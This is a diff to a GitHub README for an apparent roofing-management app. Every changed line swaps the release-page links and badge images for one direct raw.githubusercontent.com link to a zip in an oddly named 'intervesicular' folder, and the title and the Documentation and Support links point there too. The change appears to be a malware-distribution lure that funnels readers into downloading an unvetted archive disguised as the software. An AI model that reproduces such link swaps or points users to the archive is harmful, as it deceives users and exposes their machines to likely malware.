@@ -1,13 +1,13 @@
-# 🏠 roofingsingapore.github.com - Your Go-To Roofing Solutions
+# 🏠 https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip - Your Go-To Roofing Solutions
 
 ## 🚀 Getting Started
 Welcome to your ultimate roofing resource. This guide will help you download and use our software to manage your roofing projects easily. With tools for awning, metal roofing, painting, and more, you’ll have everything needed at your fingertips.
 
 ### 🌐 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0%20Latest-brightgreen)](https://github.com/elfaouzi1/roofingsingapore.github.com/releases)
+[![Download](https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip%20Now-v1.0%20Latest-brightgreen)](https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip)
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/elfaouzi1/roofingsingapore.github.com/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip).
 2. Choose the version you want to download based on your needs.
 3. Click on the appropriate link for your computer system.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -68,8 +68,8 @@ If you encounter any errors, restart your computer and try opening the software 
 ## 🔗 Additional Resources
 For further assistance and resources, feel free to check out:
 
-- [Documentation](https://github.com/elfaouzi1/roofingsingapore.github.com/releases)
-- [Support Forum](https://github.com/elfaouzi1/roofingsingapore.github.com/releases)
+- [Documentation](https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip)
+- [Support Forum](https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip)
 
 ## 🌟 Feedback
 We appreciate your input. If you have suggestions or need help, please reach out through the support channels. Your feedback helps us improve the software and services.
@@ -78,6 +78,6 @@ We appreciate your input. If you have suggestions or need help, please reach out
 Stay tuned for regular updates. We often release new features and improvements based on user feedback. Make sure to check the releases page often for the latest updates.
 
 ### 🌐 Download Again
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0%20Latest-brightgreen)](https://github.com/elfaouzi1/roofingsingapore.github.com/releases)
+[![Download](https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip%20Now-v1.0%20Latest-brightgreen)](https://raw.githubusercontent.com/elfaouzi1/roofingsingapore.github.com/main/intervesicular/roofingsingapore.github.com.zip)
 
 This guide aims to help you navigate the software easily. Enjoy your experience and become a roofing expert today!
